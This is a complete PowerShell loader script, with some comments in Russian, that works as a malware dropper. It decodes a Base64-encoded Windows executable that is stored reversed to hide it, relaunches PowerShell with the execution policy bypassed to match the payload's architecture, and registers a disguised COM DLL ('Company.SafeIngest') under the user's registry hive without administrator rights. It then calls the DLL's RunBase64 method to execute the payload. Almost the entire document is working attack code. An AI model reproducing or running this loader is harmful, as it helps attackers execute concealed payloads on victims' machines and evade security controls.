﻿# 1.ps1 — HKCU COM, auto-bitness, .NET 4.x

$ErrorActionPreference = 'Stop'

function Get-PayloadBytes {
    param([string]$Base64Path)

    if (-not (Test-Path -LiteralPath $Base64Path -PathType Leaf)) {
        throw "base64 file not found: $Base64Path"
    }

    $rev = Get-Content -Raw -LiteralPath $Base64Path
    if ([string]::IsNullOrWhiteSpace($rev)) {
        throw "base64 file is empty."
    }

    $chars = $rev.ToCharArray()
    [Array]::Reverse($chars)
    $fixed = -join $chars

    try {
        return ,([Convert]::FromBase64String($fixed)), $fixed
    }
    catch {
        throw "Invalid Base64 content in file $Base64Path"
    }
}

function Get-PEArchitecture {
    param([byte[]]$Bytes)

    # Минимальная проверка PE: "MZ" и "PE\0\0"
    if ($Bytes.Length -lt 0x100) { return "unknown" }
    if ($Bytes[0] -ne 0x4D -or $Bytes[1] -ne 0x5A) { return "unknown" }

    $e_lfanew = [BitConverter]::ToInt32($Bytes, 0x3C)
    if ($e_lfanew -lt 0 -or ($e_lfanew + 0x18) -ge $Bytes.Length) { return "unknown" }

    if ($Bytes[$e_lfanew]   -ne 0x50 -or # 'P'
        $Bytes[$e_lfanew+1] -ne 0x45 -or # 'E'
        $Bytes[$e_lfanew+2] -ne 0x00 -or
        $Bytes[$e_lfanew+3] -ne 0x00) { return "unknown" }

    # OptionalHeader.Magic (after 24 bytes of PE header)
    $optMagicOffset = $e_lfanew + 0x18
    if (($optMagicOffset + 1) -ge $Bytes.Length) { return "unknown" }
    $magic = [BitConverter]::ToUInt16($Bytes, $optMagicOffset)

    switch ($magic) {
        0x10B { return "x86" }   # PE32
        0x20B { return "x64" }   # PE32+
        default { return "unknown" }
    }
}

function Restart-InBitnessIfNeeded {
    param(
        [string]$PayloadArch # 'x86' | 'x64' | 'unknown'
    )
    $is64 = [Environment]::Is64BitProcess
    if ($PayloadArch -eq 'x86' -and $is64) {
        Write-Host "Payload is x86, current PS is 64-bit -> switching to 32-bit PowerShell..."
        $ps32 = "$env:WINDIR\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
        if (-not (Test-Path $ps32)) { throw "32-bit PowerShell not found: $ps32" }
        & $ps32 -NoProfile -ExecutionPolicy Bypass -File $PSCommandPath
        exit
    }
    elseif ($PayloadArch -eq 'x64' -and -not $is64) {
        Write-Host "Payload is x64, current PS is 32-bit -> switching to 64-bit PowerShell..."
        $ps64 = "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe"
        if (-not (Test-Path $ps64)) { throw "64-bit PowerShell not found: $ps64" }
        & $ps64 -NoProfile -ExecutionPolicy Bypass -File $PSCommandPath
        exit
    }
    else {
        Write-Host "Bitness OK: payload=$PayloadArch, PS=$(if($is64){'x64'}else{'x86'})"
    }
}

function Register-ComHKCU {
    param(
        [string]$DllPath,
        [string]$ProgId = "Company.SafeIngest",
        [string]$WorkDir
    )

    $is64 = [Environment]::Is64BitProcess
    $regAsm = if ($is64) {
        "$env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe"
    } else {
        "$env:WINDIR\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe"
    }
    if (-not (Test-Path $regAsm)) {
        throw "RegAsm not found: $regAsm"
    }

    $regOut = Join-Path $WorkDir ("SafeIngest_" + ($(if($is64){"x64"}else{"x86"})) + ".reg")
    Write-Host "Using RegAsm: $regAsm"
    & $regAsm $DllPath /codebase /regfile:$regOut
    if ($LASTEXITCODE -ne 0 -or -not (Test-Path $regOut)) {
        throw "RegAsm failed (exit $LASTEXITCODE), reg file missing: $regOut"
    }
    Write-Host "Reg file generated: $regOut"

    # HKCR -> HKCU\Software\Classes
    $userReg = Join-Path $WorkDir ([IO.Path]::GetFileNameWithoutExtension($regOut) + "_user.reg")
    (Get-Content -Raw -LiteralPath $regOut) -replace 'HKEY_CLASSES_ROOT','HKEY_CURRENT_USER\Software\Classes' |
        Set-Content -LiteralPath $userReg -Encoding ASCII
    Write-Host "User reg file: $userReg"

    $import = & reg.exe import "$userReg" 2>&1
    if ($LASTEXITCODE -ne 0) {
        throw "reg import failed: `n$import"
    }
    Write-Host "HKCU import OK."

    # Проверим ProgID и CLSID
    $progKey = "HKCU:\Software\Classes\$ProgId"
    if (-not (Test-Path $progKey)) { throw "ProgID key not found: $progKey" }

    $clsid = (Get-ItemProperty -Path "$progKey\CLSID" -ErrorAction Stop)."(default)"
    if ([string]::IsNullOrWhiteSpace($clsid)) { throw "CLSID is empty under $progKey\CLSID" }
    Write-Host "ProgID -> CLSID: $clsid"

    $clsidKey = "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"
    if (-not (Test-Path $clsidKey)) { throw "CLSID key not found: $clsidKey" }

    $codeBase = (Get-ItemProperty -Path $clsidKey -ErrorAction Stop)."CodeBase"
    if ([string]::IsNullOrWhiteSpace($codeBase)) { throw "CodeBase not set at $clsidKey" }
    Write-Host "CodeBase: $codeBase"

    return $clsid
}

# === START ===

Write-Host "=== STEP A: Resolve paths and temp ==="
$scriptDir = Split-Path -Parent $PSCommandPath
Set-Location $scriptDir

$dllPath = (Resolve-Path ".\Company.SafeIngest.dll").Path
$base64Path = (Resolve-Path ".\base64.txt").Path
$work = Join-Path $env:TEMP "SafeIngestReg"
New-Item -ItemType Directory -Force -Path $work | Out-Null
Write-Host "DLL: $dllPath"
Write-Host "B64: $base64Path"
Write-Host "Work: $work"

Write-Host "`n=== STEP B: Decode base64 (to know payload arch) ==="
$bytes, $fixedBase64 = Get-PayloadBytes -Base64Path $base64Path
$arch = Get-PEArchitecture -Bytes $bytes
Write-Host "Detected payload PE architecture: $arch"

Write-Host "`n=== STEP C: Ensure proper PowerShell bitness ==="
Restart-InBitnessIfNeeded -PayloadArch $arch
# если дошли сюда — разрядность уже корректна

Write-Host "`n=== STEP D: COM registration in HKCU via RegAsm /regfile ==="
$clsid = Register-ComHKCU -DllPath $dllPath -WorkDir $work
Write-Host "COM registered (HKCU). CLSID: $clsid"

Write-Host "`n=== STEP E: Create COM object & run ==="
try {
    # Важный момент: именно ProgId, т.к. мы регистрировали его в HKCU
    $com = New-Object -ComObject Company.SafeIngest -ErrorAction Stop
    Write-Host "COM object created."

    $com.RunBase64($fixedBase64)
    Write-Host "RunBase64 finished."
}
catch {
    Write-Error "COM activation or call failed: $($_.Exception.Message)"
    Write-Host "Diagnostic info:"
    Write-Host "  PS bitness: $(if([Environment]::Is64BitProcess){'x64'}else{'x86'})"
    Write-Host "  Payload arch: $arch"
    Write-Host "  DLL path: $dllPath"
    Write-Host "  CLSID: $clsid"
    exit 1
}
